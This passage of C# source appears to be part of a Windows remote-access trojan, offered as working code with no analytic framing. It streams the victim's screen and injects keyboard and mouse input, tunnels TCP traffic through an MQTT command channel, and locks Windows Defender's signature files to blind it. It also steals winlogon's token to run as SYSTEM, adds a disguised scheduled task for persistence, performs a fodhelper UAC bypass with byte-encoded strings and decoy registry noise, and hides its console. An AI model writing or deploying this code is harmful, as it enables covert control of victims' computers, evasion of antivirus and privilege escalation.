                        uint flags = BitConverter.ToUInt32(buffer, 9);
                        HandleMouseInput(x, y, flags);
                    }
                }
            }
        } catch { }
    }

    private static void HandleKeyInput(byte vk, byte flags) {
        try {
            keybd_event(vk, 0, flags, UIntPtr.Zero);
        } catch { }
    }

    private static void HandleMouseInput(int x, int y, uint flags) {
        try {
            SetCursorPos(x, y);
            mouse_event(flags, x, y, 0, UIntPtr.Zero);
        } catch { }
    }

    [DllImport("user32.dll")]
    private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

    [DllImport("user32.dll")]
    private static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);

    [DllImport("user32.dll")]
    private static extern bool SetCursorPos(int X, int Y);

    private static async Task StartWebSocketStreaming() {
        try {
            // Setup for fast capture
            int quality = 50;
            var qualityParam = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)quality);
            var jpegCodec = System.Drawing.Imaging.ImageCodecInfo.GetImageDecoders().First(c => c.FormatID == System.Drawing.Imaging.ImageFormat.Jpeg.Guid);
            var encoderParams = new System.Drawing.Imaging.EncoderParameters(1);
            encoderParams.Param[0] = qualityParam;
            
            int screenWidth = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
            int width = 1280;
            int height = 720;
            
            var stopwatch = System.Diagnostics.Stopwatch.StartNew();
            int frameId = 0;
            
            while (_vncActive && _vncWebSocket?.State == WebSocketState.Open) {
                try {
                    using (var bmp = new System.Drawing.Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format24bppRgb)) {
                        using (var g = System.Drawing.Graphics.FromImage(bmp)) {
                            g.Clear(Color.Black);
                            g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality;
                            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                            
                            IntPtr hdcDest = g.GetHdc();
                            IntPtr hdcSrc = GetDC(IntPtr.Zero);
                            StretchBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, screenWidth, screenHeight, 0x00CC0020 | 0x40000000);
                            ReleaseDC(IntPtr.Zero, hdcSrc);
                            g.ReleaseHdc(hdcDest);
                        }
                        
                        using (var ms = new MemoryStream()) {
                            bmp.Save(ms, jpegCodec, encoderParams);
                            byte[] imgBytes = ms.ToArray();
                            
                            // Send via WebSocket: [TYPE(1)][TARGET_ID(36)][FRAME_ID(4)][DATA]
                            byte[] packet = new byte[1 + 36 + 4 + imgBytes.Length];
                            packet[0] = 0x02; // DATA type
                            Encoding.UTF8.GetBytes(machineId.PadRight(36)).CopyTo(packet, 1);
                            BitConverter.GetBytes(frameId).CopyTo(packet, 37);
                            imgBytes.CopyTo(packet, 41);
                            
                            await _vncWebSocket.SendAsync(
                                new ArraySegment<byte>(packet),
                                WebSocketMessageType.Binary,
                                true,
                                CancellationToken.None
                            );
                            
                            frameId++;
                        }
                    }
                    
                    // Target 20 FPS
                    int elapsed = (int)stopwatch.ElapsedMilliseconds;
                    int delay = Math.Max(0, 50 - elapsed);
                    if (delay > 0) await Task.Delay(delay);
                    stopwatch.Restart();
                    
                } catch { break; }
            }
        } catch { } finally {
            _vncActive = false;
            _vncWebSocket?.Dispose();
        }
    }

    [DllImport("ntdll.dll")]
    private static extern uint NtOpenFile(out IntPtr handle, uint desiredAccess, ref OBJECT_ATTRIBUTES objAttr, out IO_STATUS_BLOCK ioStatus, uint shareAccess, uint openOptions);

    [DllImport("ntdll.dll")]
    private static extern uint NtClose(IntPtr handle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool LookupPrivilegeValue(string? lpSystemName, string lpName, out long lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public long Luid;
        public int Attributes;
    }

    static void EnablePrivilege(string name)
    {
        try {
            IntPtr hToken;
            if (OpenProcessToken(Process.GetCurrentProcess().Handle, 0x0020 | 0x0008, out hToken)) {
                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Attributes = 0x00000002; // SE_PRIVILEGE_ENABLED
                if (LookupPrivilegeValue(null, name, out tp.Luid)) {
                    AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                }
            }
        } catch { }
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string? lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string? lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    private static ConcurrentDictionary<string, TcpClient> proxyClients = new ConcurrentDictionary<string, TcpClient>();

    private static void StartProxy(IMqttClient mqttClient) {
        // Proxy Engine initialized.
    }

    private static async Task HandleProxyData(string p, IMqttClient mqttClient) {
        try {
            string[] s = p.Split(new[] { '|' }, 4);
            if (s.Length < 4) return;
            string connId = s[0];
            string type = s[1];
            string targetHost = s[2];
            int targetPort = int.Parse(s[3]);

            if (type == "CONNECT") {
                TcpClient client = new TcpClient();
                await client.ConnectAsync(targetHost, targetPort);
                proxyClients[connId] = client;
                _ = Task.Run(() => ProxyListen(connId, client, mqttClient));
            }
            else if (type == "DATA") {
                if (proxyClients.TryGetValue(connId, out var client)) {
                    byte[] data = Convert.FromBase64String(targetHost); // Host field reused for data in v9.0
                    await client.GetStream().WriteAsync(data, 0, data.Length);
                }
            }
            else if (type == "CLOSE") {
                if (proxyClients.TryRemove(connId, out var client)) client.Close();
            }
        } catch { }
    }

    private static async void ProxyListen(string connId, TcpClient client, IMqttClient mqttClient) {
        byte[] buffer = new byte[30000];
        try {
            var stream = client.GetStream();
            while (client.Connected) {
                int read = await stream.ReadAsync(buffer, 0, buffer.Length);
                if (read <= 0) break;
                string b64 = Convert.ToBase64String(buffer, 0, read);
                var msg = new MqttApplicationMessageBuilder()
                    .WithTopic($"{secretId}/{machineId}/proxy/res")
                    .WithPayload($"{connId}|DATA|{b64}")
                    .Build();
                await mqttClient.PublishAsync(msg);
            }
        } catch { } finally {
            proxyClients.TryRemove(connId, out _);
            var msgClose = new MqttApplicationMessageBuilder()
                .WithTopic($"{secretId}/{machineId}/proxy/res")
                .WithPayload($"{connId}|CLOSE|")
                .Build();
            await mqttClient.PublishAsync(msgClose);
        }
    }



    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct OBJECT_ATTRIBUTES {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct IO_STATUS_BLOCK {
        public IntPtr Status;
        public IntPtr Information;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    private static System.Collections.Generic.List<IntPtr> _nativeHandles = new System.Collections.Generic.List<IntPtr>();
    
    static string FreezeDefender()
    {
        int locked = 0;
        try {
            // UnDefend v2 using NTAPI to lock Defender's databases
            string[] paths = {
                @"\\??\\C:\ProgramData\Microsoft\Windows Defender\Scans\mpasbase.vdm",
                @"\\??\\C:\ProgramData\Microsoft\Windows Defender\Scans\mpasdlta.vdm",
                @"\\??\\C:\ProgramData\Microsoft\Windows Defender\Scans\History\Store\schemacheck.txt"
            };

            foreach (var p in paths) {
                IntPtr h;
                IO_STATUS_BLOCK isb;
                UNICODE_STRING uStr;
                IntPtr buffer = Marshal.StringToHGlobalUni(p);
                uStr.Length = (ushort)(p.Length * 2);
                uStr.MaximumLength = (ushort)(uStr.Length + 2);
                uStr.Buffer = buffer;

                OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
                objAttr.Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
                IntPtr pStr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
                Marshal.StructureToPtr(uStr, pStr, false);
                objAttr.ObjectName = pStr;
                objAttr.Attributes = 0x40; // OBJ_CASE_INSENSITIVE

                // Attempt to open with NO SHARE access to lock it
                uint status = NtOpenFile(out h, 0x100001, ref objAttr, out isb, 0, 0x20); // FILE_SYNCHRONOUS_IO_NONALERT
                if (status == 0) {
                    _nativeHandles.Add(h);
                    locked++;
                }

                Marshal.FreeHGlobal(buffer);
                Marshal.FreeHGlobal(pStr);
            }

            return locked > 0 ? $"Defender frozen (NTAPI). Locked {locked} files. AV is now blind." : "Failed to lock Defender. Missing permissions or files.";
        } catch {
            return "Critical error during NTAPI freeze.";
        }
    }

    static void PerformRedSunSYSTEM()
    {
        // Improved RedSun Logic: Native Token Stealing from winlogon.exe
        if (isElevated) {
            try {
                Process[] processes = Process.GetProcessesByName("winlogon");
                if (processes.Length > 0) {
                    IntPtr hProcess = OpenProcess(0x1000, false, processes[0].Id);
                    if (hProcess != IntPtr.Zero) {
                        IntPtr hToken;
                        if (OpenProcessToken(hProcess, 0x0002, out hToken)) {
                            IntPtr hNewToken;
                            if (DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hNewToken)) {
                                STARTUPINFO si = new STARTUPINFO();
                                si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                                string currentExe = Process.GetCurrentProcess().MainModule.FileName;
                                if (CreateProcessWithTokenW(hNewToken, 1, null, currentExe, 0x00000010, IntPtr.Zero, null, ref si, out pi)) {
                                    // Successfully spawned as SYSTEM
                                    Environment.Exit(0);
                                    return;
                                }
                            }
                        }
                    }
                }
            } catch { }

            // Fallback to schtasks if token stealing fails
            string taskName = "AetherUpdater_" + Guid.NewGuid().ToString().Substring(0, 8);
            string exe = Process.GetCurrentProcess().MainModule.FileName;
            Process.Start(new ProcessStartInfo("schtasks", $"/create /tn \"{taskName}\" /tr \"'{exe}' --task\" /sc onlogon /rl highest /f") { CreateNoWindow = true, UseShellExecute = false }).WaitForExit();
            Process.Start(new ProcessStartInfo("schtasks", $"/run /tn \"{taskName}\"") { CreateNoWindow = true, UseShellExecute = false });
            return;
        }
        
        PerformInternalUacBypass();
    }

    static void PerformInternalUacBypass()
    {
        try {
            string currentExe = Process.GetCurrentProcess().MainModule.FileName;
            
            // Software\Classes\ms-settings\Shell\Open\command
            string regPath = D(new byte[] { 6, 58, 51, 33, 34, 52, 39, 48, 9, 22, 57, 52, 38, 38, 48, 38, 9, 56, 38, 120, 38, 48, 33, 33, 60, 59, 50, 38, 9, 6, 61, 48, 57, 57, 9, 26, 37, 48, 59, 9, 54, 58, 56, 56, 52, 59, 49 });
            // DelegateExecute
            string delegateVal = D(new byte[] { 17, 48, 57, 48, 50, 52, 33, 48, 16, 45, 48, 54, 32, 33, 48 });
            // c:\windows\system32\fodhelper.exe
            string binary = D(new byte[] { 54, 111, 9, 34, 60, 59, 49, 58, 34, 38, 9, 38, 44, 38, 33, 48, 56, 102, 103, 9, 51, 58, 49, 61, 48, 57, 37, 48, 39, 123, 48, 45, 48 });
            // Software\Classes\ms-settings
            string cleanPath = D(new byte[] { 6, 58, 51, 33, 34, 52, 39, 48, 9, 22, 57, 52, 38, 38, 48, 38, 9, 56, 38, 120, 38, 48, 33, 33, 60, 59, 50, 38 });

            // START NOISE GENERATION (Distraction)
            var noiseTask = Task.Run(() => {
                try {
                    for (int i = 0; i < 40; i++) {
                        string tmp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".tmp");
                        File.WriteAllText(tmp, _InternalBuffer_X2(i));
                        using (var k = Registry.CurrentUser.CreateSubKey("Software\\AetherDistraction")) {
                            k.SetValue("Junk" + i, _InternalBuffer_X2(i * 2));
                        }
                        File.Delete(tmp);
                        System.Threading.Thread.Sleep(10);
                    }
                } catch { }
            });

            // 1. Create the ms-settings command hijack (The "Real" work)
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath)) {
                key.SetValue("", currentExe);
                key.SetValue(delegateVal, "");
            }

            // 2. Execution (Silent)
            Process.Start(new ProcessStartInfo(binary) { UseShellExecute = false, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });

            System.Threading.Thread.Sleep(1000); // Wait only 1 second to trigger

            // 3. IMMEDIATE CLEANUP (Prevents UI lock/blank screen)
            try { Registry.CurrentUser.DeleteSubKeyTree(cleanPath, false); } catch {}
            try { Registry.CurrentUser.DeleteSubKeyTree("Software\\AetherDistraction", false); } catch {}
            
            noiseTask.Wait(500);
        } catch { }
    }
    private static void HideConsole() {
        try {
            IntPtr hWnd = GetConsoleWindow();
            if (hWnd != IntPtr.Zero) ShowWindow(hWnd, 0); // 0 = SW_HIDE
        } catch { }
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);
    [DllImport("gdi32.dll")]
    public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("user32.dll")]
    public static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll")]
    public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
}
